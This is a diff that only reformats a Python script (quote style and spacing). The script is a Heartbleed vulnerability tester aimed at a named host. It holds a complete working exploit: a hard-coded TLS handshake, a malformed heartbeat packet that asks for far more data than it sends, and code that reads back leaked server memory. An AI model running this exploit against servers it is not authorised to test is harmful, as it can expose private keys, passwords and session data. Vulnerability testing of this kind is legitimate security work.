@@ -6,10 +6,13 @@ import socket
 import time
 import select
 
-def h2bin(x):
-    return x.replace(' ', '').replace('\n', '').decode('hex')
 
-hello = h2bin('''
+def h2bin(x):
+    return x.replace(" ", "").replace("\n", "").decode("hex")
+
+
+hello = h2bin(
+    """
 16 03 02 00  dc 01 00 00 d8 03 02 53
 43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
 bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
@@ -25,19 +28,22 @@ c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
 00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
 00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
 00 0f 00 01 01
-''')
+"""
+)
 
-hb = h2bin('''
+hb = h2bin(
+    """
 18 03 02 00 03
 01 00 01
 aa aa aa aa aa aa aa aa  aa aa aa aa aa aa aa aa
 aa aa aa aa aa aa aa aa  aa aa aa aa aa aa aa aa
-''')
+"""
+)
 
 
 def recvall(s, length, timeout=5):
     endtime = time.time() + timeout
-    rdata = ''
+    rdata = ""
     remain = length
     while remain > 0:
         rtime = endtime - time.time()
@@ -58,11 +64,12 @@ def recvmsg(s):
     hdr = recvall(s, 5)
     if hdr is None:
         return None, None, None
-    typ, ver, ln = struct.unpack('>BHH', hdr)
+    typ, ver, ln = struct.unpack(">BHH", hdr)
     pay = recvall(s, ln, 1)
     if pay is None:
         return None, None, None
     return typ, ver, pay
+
 
 def hit_hb(s):
     s.send(hb)
@@ -79,6 +86,7 @@ def hit_hb(s):
 
         if typ == 21:
             return False
+
 
 def test_heartbleed(url):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -97,5 +105,6 @@ def test_heartbleed(url):
     s.send(hb)
     return hit_hb(s)
 
-if __name__ == '__main__':
-    print test_heartbleed('securedjango.com')
+
+if __name__ == "__main__":
+    print test_heartbleed("securedjango.com")
